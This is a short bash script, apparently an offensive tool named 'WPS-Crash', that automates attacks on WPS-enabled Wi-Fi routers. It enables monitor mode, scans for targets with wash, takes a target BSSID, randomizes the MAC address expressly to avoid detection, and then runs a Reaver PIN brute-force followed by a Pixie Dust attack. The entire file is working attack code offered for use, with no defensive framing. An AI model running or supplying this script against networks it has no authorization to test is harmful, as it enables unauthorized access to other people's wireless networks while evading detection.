#!/bin/bash

# WPS-Crash: Automated WPS attack tool
# Author: @0xtz
# License: MIT

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root!"
    exit 1
fi

# Dependencies check
declare -a dependencies=("aircrack-ng" "reaver" "wash" "macchanger" "bully")
for dep in "${dependencies[@]}"; do
    if ! command -v $dep &>/dev/null; then
        echo "Error: $dep is not installed! Install it and retry."
        exit 1
    fi
done

# Select wireless interface
INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}')
echo "Using wireless interface: $INTERFACE"

# Enable monitor mode
sudo airmon-ng start $INTERFACE
MON_IF="${INTERFACE}mon"

# Scan for WPS-enabled networks
echo "Scanning for WPS-enabled networks..."
sudo wash -i $MON_IF -o wps_scan.txt --ignore-fcs
echo "Scan complete. Check 'wps_scan.txt' for details."

# Get target BSSID
read -p "Enter target BSSID: " BSSID

# Change MAC address to avoid detection
sudo macchanger -r $MON_IF

# Attempt WPS brute-force attack with Reaver
echo "Starting Reaver attack..."
sudo reaver -i $MON_IF -b $BSSID -vv -S -N -d 0 -T 2 -r 3:15

# If failed, attempt Pixie Dust attack
echo "Attempting Pixie Dust attack..."
sudo reaver -i $MON_IF -b $BSSID -K 1 -vv

# Restore network interface
sudo airmon-ng stop $MON_IF

echo "Attack complete. Check logs for results."

